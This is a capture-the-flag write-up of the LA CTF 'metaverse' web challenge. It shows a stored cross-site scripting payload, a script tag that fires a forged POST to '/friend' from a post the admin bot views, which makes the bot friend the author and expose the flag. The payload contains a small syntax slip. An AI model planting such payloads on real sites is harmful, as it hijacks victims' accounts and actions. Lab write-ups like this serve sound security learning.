# metaverse (web) by aplet123

```
web/metaverse
aplet123

Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

metaverse.lac.tf

You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!
```

### Site:
When we look at the site mentioned in the description we are prompted to create an account, after that we can add friends and make posts.
If we friend someone like admin, we are listed on their friends list but they not on ours. If we friend ourselves we see our name and display name on our friendlist.

By creating a post with the text `<script>alert(1)</script>` I saw that the post section of the site was vulnerable to xss and xsrf.

If we look at the source code we can also see that the admin's display name is the flag.
So putting all that together, one might be able to forge a request so that the admin friends a certain user.

### Source Code:
We get an index.js file: (I left out the unnecessary parts since it's a long file)
```
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

### Solution:
When I inspected the site I saw a script with the interesting section:
```
function friend() {
    fetch("/friend", {
        method: "POST",
        body: "username=" + encodeURIComponent(document.getElementById("friend").value),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    }).then((res) =>
        res.text().then((t) => {
            if (res.status !== 200) {
                document.querySelector(".error")?.remove();
                const error = document.createElement("p");
                error.innerText = t;
                error.classList.add("error");
                document.body.insertAdjacentElement("afterbegin", error);
            } else {
                location.reload();
            }
        })
    );
}
```
So I copied the section
```
fetch("/friend", {
        method: "POST",
        body: "username=" + encodeURIComponent(document.getElementById("friend").value),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    })
```
changed it to
```
<script>fetch("/friend", {
    method: "POST",
    body: username=metaman,
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
})</script>
```
made a post containing that text and sent the link to the admin bot who friended me and showed me the flag:
```
metafriend list:

metaman (metaman)

lactf{please_metaget_me_out_of_here} (admin)
```
Was a fun challenge, even with little experience in web exploitation.